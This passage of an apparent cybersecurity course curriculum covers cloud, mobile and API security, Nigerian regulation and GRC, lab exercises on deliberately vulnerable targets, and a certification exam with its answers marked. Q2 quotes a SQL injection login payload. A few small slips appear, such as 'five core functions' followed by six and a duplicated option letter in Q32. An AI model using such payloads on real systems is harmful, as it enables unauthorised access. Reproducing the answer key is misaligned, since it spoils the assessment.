- Roles: Sets of permissions assumable by services/users
- Policies: JSON documents defining permissions
- Groups: Collections of users sharing policies

**IAM best practices:**
- Root account: MFA enabled, no access keys, used only for billing
- Least privilege: Every user/role gets minimum permissions needed
- Service accounts: Applications use roles, not user accounts
- Regular access reviews: Quarterly review of who has what access

**Security services:**
- **CloudTrail:** Logs all API calls to AWS account. Essential for incident response.
- **Config:** Monitors and records configuration changes. Alerts when settings deviate from baseline.
- **GuardDuty:** Threat detection service. Analyses CloudTrail, VPC Flow Logs, DNS logs for threats.
- **Security Hub:** Centralised security findings from multiple services.
- **WAF:** Web Application Firewall for CloudFront/ALB — filters malicious web traffic.
- **Shield:** DDoS protection (Standard is free; Advanced is paid).

#### 11.3 Mobile Security (Nigerian Context)

Nigeria has over 220 million mobile subscriptions. Mobile banking is the primary banking interface for millions. Mobile application security is critical.

**OWASP Mobile Top 10 (relevant to Nigerian fintech):**
1. **Improper Platform Usage:** Using iOS/Android security features incorrectly
2. **Insecure Data Storage:** Storing sensitive data in cleartext on device
3. **Insecure Communication:** Not enforcing certificate pinning — susceptible to MitM
4. **Insecure Authentication:** Allowing PIN-only auth without biometric/MFA option
5. **Insufficient Cryptography:** Using MD5 for checksums, weak RNG for OTP generation
6. **Insecure Authorisation:** Mobile API doesn't validate that the logged-in user is the actual account owner
7. **Client Code Quality:** Buffer overflows, format string vulnerabilities in native code
8. **Code Tampering:** Not detecting when app is modified or running on rooted device
9. **Reverse Engineering:** Storing secrets (API keys) in the APK where anyone can extract them
10. **Extraneous Functionality:** Debug code left in production that enables bypass

**Certificate Pinning:** The app only trusts a specific certificate or public key, not the OS certificate store. Prevents MitM attacks that use a custom root CA. Used by Nigerian banking apps.

#### 11.4 API Security

Modern Nigerian digital infrastructure is API-driven. Flutterwave, Paystack, NIBSS all provide APIs. Securing APIs is critical.

**OWASP API Security Top 10:**

1. **Broken Object Level Authorisation (BOLA/IDOR):** API endpoint `/api/accounts/[ID]` — user can access any account by changing the ID.
2. **Broken Authentication:** Weak tokens, missing token expiry, tokens in URL parameters (logged everywhere)
3. **Broken Object Property Level Authorisation:** API returns more fields than the user should see (internal IDs, admin flags)
4. **Unrestricted Resource Consumption:** No rate limiting — attacker can send millions of API calls
5. **Broken Function Level Authorisation:** Regular users can call admin endpoints
6. **Unrestricted Access to Sensitive Business Flows:** No limit on OTP attempts, loan applications, account creation — enables automation attacks

**API security controls:**
- Authentication: OAuth 2.0/JWT — always validate tokens
- Authorisation: Check that the authenticated user owns the requested resource
- Rate limiting: Throttle requests per user/IP/API key
- Input validation: Validate all parameters
- Output filtering: Return only what's needed
- Logging: Log all API calls with user, timestamp, endpoint, response code

---

### Module 11 Labs

**Lab 11.1 — Cloud Misconfiguration Identification**
Platform: AWS Free Tier account (student uses own) or Flaws.cloud (free cloud security challenge)
Task: Complete the first 6 levels of the flaws.cloud challenge — a series of misconfigured S3 buckets and IAM roles designed to be discovered and exploited.
Duration: 90 minutes

**Lab 11.2 — Mobile App Security Analysis**
Platform: MobSF (Mobile Security Framework — free, open source)
Task: Analyse a provided Android APK using MobSF. Document:
- Permissions requested (are any unnecessary?)
- Hardcoded secrets (API keys, credentials)
- Use of weak cryptography
- Data storage issues
- Network security configuration
Duration: 60 minutes

**Lab 11.3 — API Security Testing (Burp Suite)**
Platform: Burp Suite + a provided API (OWASP crAPI — Completely Ridiculous API)
Task: Set up crAPI locally. Using Burp Suite:
- Test for BOLA (access another user's vehicle)
- Test for broken authentication (missing token validation)
- Test for rate limiting (on OTP endpoints)
Duration: 90 minutes

---

### Module 11 Assignments

1. **AWS Security Architecture:** Design a secure AWS architecture for a Nigerian bank's mobile banking backend. Include: VPC design, security groups, IAM roles, encryption at rest/in transit, logging, monitoring, and backup. Use AWS architecture diagram notation.

2. **Cloud Misconfiguration Report:** Using only passive research (Shodan, public breach reports, security researcher blogs), document 3 cases where cloud misconfigurations affected African or Nigerian organisations. For each: describe the misconfiguration, the data exposed, the impact, and how it was fixed.

3. **Nigerian Fintech API Security Review:** Choose a Nigerian fintech's public API (Flutterwave, Paystack, or Cowry Wise public documentation). Analyse the API documentation for security concerns. Does it enforce authentication? Is there rate limiting? Does it expose unnecessary data in responses? Does it recommend secure integration patterns?

4. **IoT Security in Nigeria:** Smart meters, IP cameras, and connected devices are growing in Nigeria. Research and document 3 IoT security incidents globally that are relevant to Nigerian deployments. For each: what was vulnerable, what was the impact, and what Nigerian-specific risk factors apply.

5. **Mobile Banking App Security Comparison:** Compare the security features of two Nigerian banking apps (without reverse engineering — use publicly available information, privacy policies, and any documented security features). What security practices are evident? What questions remain about their implementation?

---

## MODULE 12: GOVERNANCE, RISK & COMPLIANCE (GRC) AND FUTURE OF CYBERSECURITY
### The Business of Security

---

### Module Overview
Technical cybersecurity skills must be embedded in a governance framework. This final module covers how security is managed at the organisational level, regulatory compliance for Nigerian organisations, and the future of cybersecurity — preparing students for a career in a rapidly evolving field.

### Module Objectives
By the end of this module, students will be able to:
1. Explain the GRC (Governance, Risk, Compliance) framework
2. Perform a basic information security risk assessment
3. Describe Nigerian regulatory requirements for cybersecurity (CBN, NDPC, NCC, NITDA)
4. Apply ISO 27001 and NIST CSF frameworks
5. Develop and communicate a security strategy to non-technical stakeholders
6. Identify emerging trends: AI in security, quantum cryptography, zero-trust

---

### Core Concepts

#### 12.1 Governance, Risk & Compliance

**Governance:** The policies, procedures, roles, and decisions that determine how an organisation approaches information security.
- Security policies (what we do and don't do)
- Standards (how we implement policies — specific technical requirements)
- Procedures (step-by-step instructions)
- Guidelines (recommendations and best practices)

**Risk Management:**
Risk = Threat × Vulnerability × Impact

**The risk assessment process:**
1. **Asset identification:** What do we have that needs protecting? (Data, systems, processes)
2. **Threat identification:** Who/what might attack us? (Nation-states, criminals, insiders, accidents)
3. **Vulnerability assessment:** Where are we weak? (Technical + procedural + physical)
4. **Risk calculation:** For each threat-vulnerability pair, assess likelihood × impact
5. **Risk treatment:** Accept | Mitigate | Transfer (insurance) | Avoid

**Risk heat map:** Plot risks on a matrix: Likelihood (1–5) × Impact (1–5) = Risk Score. Prioritise treatment of high-likelihood, high-impact risks.

**Compliance:** Meeting external legal and regulatory requirements.
Nigerian organisations face multiple overlapping compliance frameworks.

#### 12.2 Nigerian Regulatory Landscape

**CBN Cybersecurity Framework for Banks (2022):**
Mandatory for all banks and financial institutions licensed by CBN. Key requirements:
- Establish a Cybersecurity Governance structure (Board-level oversight)
- Appoint a Chief Information Security Officer (CISO) and document the role
- Conduct annual penetration testing by qualified external testers
- Implement security controls aligned with the framework's control areas
- Participate in the Financial Industry Cybersecurity Committee (FICC) information sharing
- Report cybersecurity incidents to CBN Financial Policy and Regulation Department within 24 hours

**NDPA 2023 (Cybersecurity implications):**
- Data Protection Impact Assessment (DPIA) required before processing high-risk personal data
- Technical security measures mandatory for personal data processing
- Data Protection Officer (DPO) required for large-scale processors
- Breach notification: NDPC within 72 hours

**NCC (Nigerian Communications Commission):**
Cybersecurity regulations for telecom operators. MTN, Airtel, Glo, 9Mobile must maintain cybersecurity standards for their infrastructure and customer data.

**NITDA (National Information Technology Development Agency):**
- Issues cybersecurity guidelines for IT companies
- Oversees data localisation requirements
- Manages Nigeria's Computer Emergency Response Team (ngCERT)

**ngCERT (Nigeria Computer Emergency Response Team):**
Nigeria's national CERT — coordinates cyber incident response for government and critical infrastructure. Security professionals should know how to report to ngCERT.

#### 12.3 Security Frameworks

**ISO/IEC 27001 — International Standard:**
A risk-based framework for establishing, implementing, maintaining, and improving an Information Security Management System (ISMS).
- Controls: 93 controls in ISO 27002 (the implementation guide)
- Certification: Organisations can get ISO 27001 certified — an internationally recognised credential
- Process-focused: About having a system, not just technical controls

**NIST Cybersecurity Framework (CSF) 2.0:**
Five core functions:
1. **Govern:** Establish security strategy, policy, and oversight
2. **Identify:** Understand the organisational assets, risks, and environment
3. **Protect:** Implement safeguards — access control, training, data security
4. **Detect:** Identify cybersecurity events — monitoring, anomaly detection
5. **Respond:** Act on detected incidents — response planning, communications
6. **Recover:** Restore capabilities — recovery planning, improvements

**PCI DSS (Payment Card Industry Data Security Standard):**
Mandatory for any organisation that processes credit/debit card data. Relevant to Nigerian merchants and fintechs processing card payments. 12 requirements covering network security, cardholder data protection, vulnerability management, access control, monitoring, and information security policies.

#### 12.4 Communicating Security to Business Leaders

The CISO's most important skill: translating security risk into business language.

**Wrong (technical framing):**
"We have 47 CVEs with CVSS > 7.0 on production systems. Our patching cadence is 68 days average. We need a WAF deployment and SOC tier 2 capability."

**Right (business framing):**
"Our current vulnerability profile exposes us to breach risk similar to what hit Equifax in 2017, which cost them $575M. Investing ₦120M in three specific controls reduces our exposure by an estimated 65% and positions us for CBN compliance. The cost of a breach — regulatory fines, customer compensation, reputational damage — could exceed ₦500M."

**Security metrics that matter to boards:**
- Mean Time to Detect (MTTD): How long before we notice a breach?
- Mean Time to Respond (MTTR): How long to contain it?
- Patch coverage %: What % of critical patches are applied within SLA?
- Phishing simulation click rate: What % of employees fell for simulated phishing?
- Third-party risk: What % of vendors have been assessed?

#### 12.5 The Future of Cybersecurity

**AI in Cybersecurity (Attacker):**
- AI-generated phishing at scale — personalised spear phishing for millions of targets
- AI-powered password cracking and vulnerability research
- Deepfake audio/video for social engineering (CEO voice clone in a vishing call)
- Automated vulnerability discovery in AI systems

**AI in Cybersecurity (Defender):**
- UEBA (User and Entity Behaviour Analytics): AI baseline of normal behaviour, detect anomalies
- AI-powered SIEM: Reduce alert fatigue by correlating and prioritising thousands of alerts
- Automated incident response: Contain threats without human intervention
- AI code analysis: Identify security vulnerabilities in code before deployment

**Zero Trust Architecture:**
"Never trust, always verify." The traditional model assumed internal network = safe. Zero trust assumes breach and verifies every request:
- Verify the user's identity (MFA)
- Verify the device's health
- Verify the user's access rights
- Verify based on time/location/behaviour
- Log and inspect all traffic

**Quantum Computing and Cryptography:**
Quantum computers will eventually break RSA and ECC — the asymmetric encryption that secures the internet. Timeline: 10–20 years.
Post-quantum cryptography (PQC): NIST finalised 4 post-quantum cryptographic standards in 2024. Organisations should begin planning the transition.

**Nigerian Cybersecurity Future:**
- Growing government investment in ngCERT and cybersecurity infrastructure
- West Africa Cybersecurity Centre developing
- Demand for local security talent dramatically outpacing supply — the opportunity window is now
- African financial sector increasingly targeted — need for continent-level information sharing

---

### Module 12 Labs

**Lab 12.1 — Risk Assessment Exercise**
Platform: Spreadsheet (Excel/Google Sheets)
Task: Perform a risk assessment for a hypothetical Nigerian retail company with 10 branches, 200 employees, an e-commerce website, and a customer database of 80,000 records.
- Identify 15 assets
- Identify 20 threats
- Rate each threat per asset for likelihood and impact
- Calculate risk scores
- Recommend treatments for the top 5 risks
Duration: 90 minutes

**Lab 12.2 — NIST CSF Self-Assessment**
Platform: NIST CSF tool (cisa.gov/cyberframework) or spreadsheet
Task: Using the NIST CSF, assess the cybersecurity posture of a Nigerian organisation from publicly available information (website, press releases, job listings that reveal security investments, any disclosed incidents). Rate each function (Govern/Identify/Protect/Detect/Respond/Recover) on a 1–4 maturity scale. Provide an evidence-based report.
Duration: 60 minutes

**Lab 12.3 — CBN Cybersecurity Framework Review**
Platform: CBN website (cbn.gov.ng) — access the published framework
Task: Download and review the CBN Risk-Based Cybersecurity Framework for Banks. Identify the 10 most important controls from a technical perspective. For each: describe the requirement, how a bank would implement it, and one way compliance could be verified.
Duration: 60 minutes

---

### Module 12 Assignments

1. **Security Strategy Presentation:** Create an 8-slide executive presentation recommending a cybersecurity investment strategy for a mid-sized Nigerian insurance company. Use business language. Include: current risk exposure, proposed investment (₦-denominated budget), expected risk reduction, regulatory compliance benefit, and timeline.

2. **GRC Policy Writing:** Write three information security policies for a Nigerian tech company: (1) Acceptable Use Policy, (2) Incident Response Policy, (3) Password and Authentication Policy. Each policy should be 1–2 pages.

3. **NDPC Compliance Readiness Assessment:** Design a NDPA 2023 compliance checklist for a Nigerian fintech. Based on publicly available information, assess whether any fintech of your choice appears to meet the key requirements.

4. **Cybersecurity Career Path Planning:** Create a 5-year cybersecurity career development plan for yourself. Include: certifications to pursue (with exam details and costs), skills gaps to fill, roles to target at each stage, networking strategy (conferences, LinkedIn, ngCERT community), and salary milestones.

5. **Zero Trust Implementation Plan:** A Nigerian bank wants to implement a Zero Trust architecture over 24 months. Create a phased implementation roadmap: what to implement in months 1–6, 7–12, 13–18, 19–24. Justify the sequencing.

---

## CAPSTONE PROJECT OPTIONS

Students must complete ONE capstone project from the options below. The capstone is mandatory for certification and accounts for 25% of the final assessment.

---

### Option A: Penetration Test Report
**Simulate a complete penetration test** on a lab environment (TryHackMe room, HackTheBox machine, or instructor-provided VM):

Deliverables:
1. Pre-engagement documentation (scope definition, rules of engagement)
2. Reconnaissance report (passive and active)
3. Vulnerability assessment (minimum 5 findings)
4. Exploitation evidence (screenshots, proof of access)
5. Post-exploitation findings (data accessed, lateral movement)
6. Professional penetration test report (executive summary + technical findings)
7. Remediation recommendations for all findings

Evaluation criteria: Methodology adherence, completeness, report quality, technical accuracy, risk rating accuracy.

---

### Option B: Security Operations Centre (SOC) Simulation
**Set up and operate a mini-SOC** for a simulated organisation:

Deliverables:
1. Security architecture document (SIEM selection, log sources, detection rules)
2. 15+ detection rules (using Sigma format or SIEM-specific syntax)
3. Analysis of 50 provided alerts — triage each as true/false positive with evidence
4. 3 full incident reports for the true positive alerts
5. SIEM dashboard showing key security metrics
6. SOC operating procedures document

---

### Option C: Malware Analysis & Threat Intelligence Report
**Analyse a malware family relevant to African/Nigerian organisations:**

Deliverables:
1. Static analysis report (strings, PE headers, imports, suspicious indicators)
2. Dynamic analysis report (ANY.RUN sandbox — process, network, persistence)
3. MITRE ATT&CK framework mapping for all identified TTPs
4. Complete IOC list (hashes, IPs, domains, registry keys, file paths)
5. YARA rule to detect the malware (or variants)
6. Threat intelligence report for organisational stakeholders
7. Executive summary and recommendations

---

### Option D: Security Awareness Programme for a Nigerian Organisation
**Design and pilot a complete security awareness programme:**

Deliverables:
1. Organisation security awareness needs assessment
2. 12-month security awareness training calendar
3. 3 training modules (1 hour each) — scripted, with slides and exercises
4. Simulated phishing campaign design (templates, metrics, training response)
5. Metrics framework (how to measure programme effectiveness)
6. Budget and implementation roadmap
7. Pilot programme report (present to real audience, gather feedback)

---

### Option E: Cybersecurity Strategy for a Nigerian SME
**Develop a complete cybersecurity strategy** for a real or fictional Nigerian SME (20–100 employees):

Deliverables:
1. Organisational risk assessment (minimum 20 risks identified and rated)
2. Current state vs target state gap analysis
3. NIST CSF-aligned security roadmap (12–24 months)
4. Security policy suite (minimum 5 policies)
5. Technical control implementation guide (prioritised by risk)
6. Budget: Show total investment in Naira with ROI justification
7. Executive board presentation (10 slides maximum)

---

### Capstone Rubric

| Criterion | Weight | Excellent (90–100%) | Good (75–89%) | Adequate (60–74%) | Needs Work (<60%) |
|---|---|---|---|---|---|
| Technical Accuracy | 30% | All findings accurate, no errors | Minor inaccuracies | Some significant errors | Fundamental errors |
| Methodology | 20% | Industry-standard, well-documented | Appropriate, mostly documented | Partially followed | Ad hoc, undocumented |
| Communication | 20% | Executive and technical writing excellent | Clear, minor issues | Adequate but unclear | Poor communication |
| Completeness | 15% | All deliverables, exceeds requirements | All deliverables met | Most deliverables | Major gaps |
| Nigerian Context | 10% | Strong local context throughout | Some local context | Minimal local reference | Generic only |
| Ethics & Legality | 5% | Clear ethical framework, legal compliance | Adequate attention | Some gaps | Concerning gaps |

---

## CERTIFICATION EXAMINATION

### MetaBridge Cybersecurity Professional Certificate

**Format:** 4 sections | 4 hours total | Administered online with proctoring
**Pass mark:** 75% (75+ marks out of 100)
**Distinction:** 85%+ marks
**Blockchain verification:** All certificates recorded on MetaBridge blockchain system

---

### Section A: Multiple Choice (40 questions | 40 marks)

Question distribution:
- Module 1 (Intro & CIA Triad): 4 questions
- Module 2 (Networking): 4 questions
- Module 3 (Linux): 3 questions
- Module 4 (Cryptography): 4 questions
- Module 5 (Network Security): 4 questions
- Module 6 (Penetration Testing): 4 questions
- Module 7 (Web App Security): 5 questions
- Module 8 (Social Engineering): 4 questions
- Module 9 (Malware Analysis): 3 questions
- Module 10 (Incident Response): 3 questions
- Module 11 (Cloud Security): 3 questions
- Module 12 (GRC): 3 questions

**Sample MCQ Bank (40 Questions):**

Q1. An attacker encrypts a hospital's patient records and demands ₦10M in Bitcoin for the decryption key. Which CIA Triad principle is primarily violated? A) Confidentiality B) Integrity C) **Availability ✓** D) Authentication

Q2. The `--` in a SQL injection payload `admin'--` is used to: A) Comment out the injection B) **Comment out the remainder of the SQL query ✓** C) Start a new SQL statement D) Escape the single quote

Q3. Which protocol should ALWAYS be used instead of Telnet for remote server administration? A) FTP B) SFTP C) **SSH ✓** D) RDP

Q4. A file's SHA-256 hash before transfer is `abc123...`. After transfer, the hash is `def456...`. What does this indicate? A) The hash algorithm changed B) The file was compressed C) **The file was modified or corrupted during transfer ✓** D) SHA-256 is not deterministic

Q5. What is the primary purpose of a Certificate Authority (CA)? A) To encrypt web traffic B) To store digital signatures C) **To verify and vouch for the identity of certificate holders ✓** D) To manage firewall rules

Q6. Which OWASP Top 10 vulnerability allows an attacker to access another user's data by changing an ID in the URL? A) Injection B) Cryptographic Failures C) **Broken Access Control ✓** D) Security Misconfiguration

Q7. A penetration tester begins scanning a client's production servers without a signed agreement. Under Nigerian law, this is: A) Acceptable if the tester has good intentions B) Acceptable if they notify the client afterwards C) **Potentially criminal under the Cybercrimes Act 2015 ✓** D) Only a violation if data is stolen

Q8. Which tool is most commonly used for professional web application penetration testing? A) Wireshark B) Nmap C) **Burp Suite ✓** D) Metasploit

Q9. In symmetric encryption, what is the primary security challenge? A) Slow encryption speed B) Large ciphertext size C) **Securely distributing the shared key ✓** D) Limited algorithm choices

Q10. What does `nmap -sV` do? A) Scan for vulnerabilities B) **Detect service versions on open ports ✓** C) Perform a stealth scan D) Scan for open UDP ports

Q11. An attacker calls a bank employee claiming to be from IT support and asks for their password to "fix an issue." This is: A) Phishing B) Smishing C) **Vishing (voice phishing) ✓** D) Pretexting only

Q12. The NIST Incident Response Lifecycle's first phase is: A) Detection B) Containment C) **Preparation ✓** D) Recovery

Q13. Which file permission (octal notation) gives the owner read/write/execute, group read/execute, and others read only? A) 644 B) 777 C) 600 D) **754 ✓**

Q14. What is SIM swap fraud? A) Inserting a stolen SIM into a new phone B) **Convincing a telecom to transfer a victim's number to an attacker's SIM ✓** C) Exploiting SIM card encryption vulnerabilities D) Duplicating a SIM card electronically

Q15. SPF, DKIM, and DMARC are email security protocols that primarily prevent: A) Email encryption failures B) **Email spoofing and impersonation ✓** C) Email attachment malware D) Spam email delivery

Q16. Which Linux command shows currently listening network ports? A) `netstat --open` B) `ports -l` C) **`ss -tlnp` ✓** D) `ifconfig -ports`

Q17. In cloud security, the "shared responsibility model" means: A) The cloud provider is responsible for all security B) The customer is responsible for all security C) **Security responsibilities are divided between provider and customer depending on the service type ✓** D) Both parties share equal responsibility for everything

Q18. WEP WiFi security should never be used because: A) It's slow B) It only supports 2.4GHz **C) It uses RC4 encryption which is cryptographically broken and can be cracked in minutes ✓** D) It doesn't support modern devices

Q19. What is the MITRE ATT&CK framework? A) A certification for penetration testers B) A CVE scoring system C) **A knowledge base of adversary tactics and techniques based on real-world observations ✓** D) A network scanning tool

Q20. Cross-Site Scripting (XSS) targets: A) The web server B) The database C) **The web browser of the site's users ✓** D) The web application's API

Q21. An attacker's server that receives data from malware deployed on victim systems is called: A) A pivot point B) A honeypot C) **A Command and Control (C2) server ✓** D) A proxy server

Q22. The principle of "least privilege" means: A) Users must use the weakest passwords B) **Users and systems should have only the minimum access needed for their function ✓** C) Senior employees have more security privileges D) Privileges should be assigned last

Q23. Which ransomware vulnerability allowed WannaCry to spread automatically across networks? A) XSS B) SQL injection C) DNS poisoning D) **EternalBlue (MS17-010), an SMB vulnerability ✓**

Q24. A DPIA (Data Protection Impact Assessment) is required under which Nigerian law? A) CBN Cybersecurity Framework B) Cybercrimes Act 2015 C) NITDA Guidelines D) **NDPA 2023 ✓**

Q25. Passive reconnaissance involves: A) Port scanning target systems B) Testing web application inputs C) **Gathering information without directly interacting with target systems ✓** D) Exploiting vulnerabilities in target systems

Q26. Which hashing algorithm is considered cryptographically broken and should NOT be used for security? A) SHA-256 B) SHA-3 C) bcrypt D) **MD5 ✓**

Q27. In the context of digital forensics, "chain of custody" refers to: A) The encryption chain protecting evidence B) **The documented chronological record of who handled evidence and when ✓** C) The blockchain storing forensic hashes D) The chain of events leading to the incident

Q28. HSTS (HTTP Strict Transport Security) prevents which attack? A) SQL injection B) XSS C) **SSL stripping ✓** D) CSRF

Q29. An employee receives an email "From: CEO [ceo@company.com]" instructing an urgent wire transfer. The email's actual origin is `ceo@company-secure.biz`. This is: A) Phishing B) **Business Email Compromise (BEC) / Spear phishing ✓** C) Vishing D) Smishing

Q30. Which document type is legally required BEFORE a penetration tester can begin work on a client's systems? A) Non-Disclosure Agreement only B) Statement of Work only C) **A signed Penetration Test Agreement authorising the engagement ✓** D) A NITDA permit

Q31. The order of volatility in digital forensics requires collecting evidence from: A) Disk first, then RAM B) **Most volatile (RAM) to least volatile (disk) ✓** C) Alphabetical order of data source D) Largest to smallest

Q32. Google Dorking uses: A) Password cracking techniques B) **Advanced search operators to find sensitive information indexed by search engines ✓** C) Network scanning B) SQL injection techniques

Q33. A CVSS score of 9.5 indicates: A) Low severity vulnerability B) Medium severity vulnerability C) High severity vulnerability D) **Critical severity vulnerability ✓**

Q34. TLS ensures secure communication by: A) Using symmetric encryption only B) **Using asymmetric encryption to establish a shared key, then symmetric for data ✓** C) Hashing all transmitted data D) Requiring client certificates always

Q35. The Cybercrimes Act 2015, Section 6, criminalises: A) Data protection violations B) Financial fraud C) **Unauthorised access to computer systems ✓** D) Cyberstalking

Q36. Shodan is used by security professionals to: A) Crack WiFi passwords B) Analyse malware behaviour C) **Discover internet-facing devices and exposed services ✓** D) Generate phishing emails

Q37. A stateful firewall differs from a packet-filtering firewall because it: A) Filters based on IP addresses B) **Tracks connection state and understands which packets belong to established sessions ✓** C) Operates at the application layer D) Is faster than packet filtering

Q38. Which OWASP risk is primarily caused by components with known, unpatched CVEs? A) A01 Broken Access Control B) A02 Cryptographic Failures C) A04 Insecure Design D) **A06 Vulnerable and Outdated Components ✓**

Q39. Zero Trust Architecture operates on the principle: A) Internal networks are trusted by default B) Cloud environments are inherently secure C) **Never trust, always verify — every request must be authenticated and authorised ✓** D) Zero security controls are needed for internal systems

Q40. Under NDPA 2023, how soon after discovering a data breach must an organisation notify the NDPC? A) 24 hours B) 48 hours C) **72 hours ✓** D) 7 days

---

### Section B: Short Answer (20 marks)

Students answer FOUR of six questions (5 marks each, 15 minutes per question):

1. Explain the difference between a virus, a worm, and a Trojan horse. Give a real-world example of each type.

2. Describe the complete TLS handshake process, explaining what happens at each step and why each step is necessary.

3. A penetration tester is about to begin an engagement. List 5 items of documentation they must have before starting, and explain why each is necessary.

4. Explain SQL injection: how it works, provide an example of a vulnerable query and a malicious input, and describe two technical controls that prevent it.

5. Describe the NIST Incident Response lifecycle's four phases. For a ransomware incident at a Nigerian hospital, describe one specific action the response team should take in each phase.

6. What is the Shared Responsibility Model in cloud computing? Give three examples of responsibilities that are always the customer's, regardless of cloud service type.

---

### Section C: Practical Case Study (25 marks)

**Case Study 1: The Nigerian Bank Breach (15 marks)**

*Scenario:* SecureBank Nigeria (fictional) processes 2 million transactions daily. On a Friday evening, the SOC receives alerts: unusual database queries are running, accessing millions of customer records at 10× the normal rate. A developer's account appears to be responsible. The developer is unreachable. External security researchers contact the bank's PR team saying they've found the bank's customer data for sale on a dark web forum. The data includes: full names, BVN, account numbers, phone numbers, and transaction history for approximately 800,000 customers.

*Questions (15 marks):*
a) Classify this incident by type and severity. Justify your classification. (2 marks)
b) Describe the immediate containment actions the incident response team should take in the first hour. (4 marks)
c) Under NDPA 2023, what are SecureBank's legal obligations? Include specific timelines and notification requirements. (3 marks)
d) What technical evidence should the forensics team prioritise collecting? In what order, and why? (3 marks)
e) What long-term controls should prevent this type of incident? (3 marks)

**Case Study 2: Phishing Attack on a Lagos Trading Company (10 marks)**

*Scenario:* Adeleke & Sons Import/Export (fictional) has 45 employees. The company's finance director, Bola Adeleke, receives an email appearing to be from their long-standing Chinese supplier. The email says there's been a "banking change" and requests that the next payment of $180,000 be sent to a new account. Bola processes the transfer. Two weeks later, the real supplier calls asking why payment was delayed. The money is gone.

*Questions (10 marks):*
a) What type of attack is this? What technical and social engineering elements made it successful? (3 marks)
b) What technical email controls would have made this attack harder to execute? (3 marks)
c) What procedural controls (not technical) would have prevented this specific attack? (2 marks)
d) Can the money be recovered? What should Adeleke & Sons do immediately upon discovering the fraud? (2 marks)

---

### Section D: Extended Response — Essay (15 marks)

Choose ONE of two essay questions. Answer in 600–900 words.

**Option 1:** "The Nigerian cybersecurity professional faces a threat landscape that combines global attack techniques with uniquely Nigerian vulnerabilities — from SIM swap fraud to BEC operations that have defrauded billions globally." Evaluate this statement. Discuss three specific Nigerian cybersecurity challenges, the technical and non-technical defences available, and the role MetaBridge-trained professionals can play in building Nigeria's cyber resilience.

**Option 2:** "Zero trust is not a product you can buy — it's an architecture and mindset that must be embedded into every layer of an organisation." Critically evaluate zero trust as a security model. What problems does it solve that traditional perimeter security cannot? What are the implementation challenges for Nigerian organisations with limited budgets and mixed legacy/cloud infrastructure? Propose a pragmatic phased zero trust roadmap for a Nigerian mid-market company.

---

### Exam Grading

| Score | Grade | Certificate Status |
|---|---|---|
| 85–100 | Distinction | MetaBridge Cybersecurity Professional Certificate with Distinction |
| 75–84 | Pass | MetaBridge Cybersecurity Professional Certificate |
| 60–74 | Referred | May resit Section(s) where score was below 75% |
| Below 60 | Fail | Full resit required (minimum 30-day waiting period) |

**Blockchain Verification:** All passing certificates are recorded on the MetaBridge blockchain system. Employers and institutions can verify authenticity at metabridgeacademy.com/verify.

---

*End of Cybersecurity Curriculum — Part 2 (Modules 7–12, Capstone, Certification Exam)*

---

*MetaBridge Academy | Cybersecurity Curriculum Part 2 | Course 4 of 4*
*Textbook reference: Cybersecurity Sefer — metabridgeacademy.com*
*All enrolment: https://wa.me/2347034357206*
